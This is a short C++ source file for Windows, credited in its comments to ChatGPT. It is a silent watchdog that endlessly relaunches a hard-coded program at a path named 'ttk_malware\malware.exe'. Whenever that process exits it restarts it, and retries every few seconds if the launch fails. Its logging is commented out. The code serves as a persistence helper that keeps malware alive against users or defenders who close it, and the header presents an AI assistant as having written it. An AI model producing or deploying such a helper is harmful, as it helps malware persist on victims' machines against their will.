// This script is not made by me T3CHN0
// It's made by ChatGPT

#include <windows.h>
#include <iostream>

int main() {
    const char* programPath = "C:\\ttk_malware\\malware.exe"; // ðŸ‘ˆ change this

    while (true) {
        STARTUPINFO si = { sizeof(STARTUPINFO) };
        PROCESS_INFORMATION pi;

        // std::cout << "[Watchdog] Starting program: " << programPath << std::endl;

        if (!CreateProcess(
            programPath,   // Application name
            NULL,          // Command line
            NULL,          // Process handle not inheritable
            NULL,          // Thread handle not inheritable
            FALSE,         // Set handle inheritance to FALSE
            0,             // No creation flags
            NULL,          // Use parent's environment block
            NULL,          // Use parent's starting directory 
            &si,           // Pointer to STARTUPINFO structure
            &pi            // Pointer to PROCESS_INFORMATION structure
        )) {
            // std::cerr << "CreateProcess failed (" << GetLastError() << ").\n";
            Sleep(5000); // Wait before retry
            continue;
        }

        // Wait until program exits
        WaitForSingleObject(pi.hProcess, INFINITE);

        // std::cout << "[Watchdog] Program closed. Restarting...\n";

        // Close process and thread handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        Sleep(2000); // Small delay before restart
    }

    return 0;
}
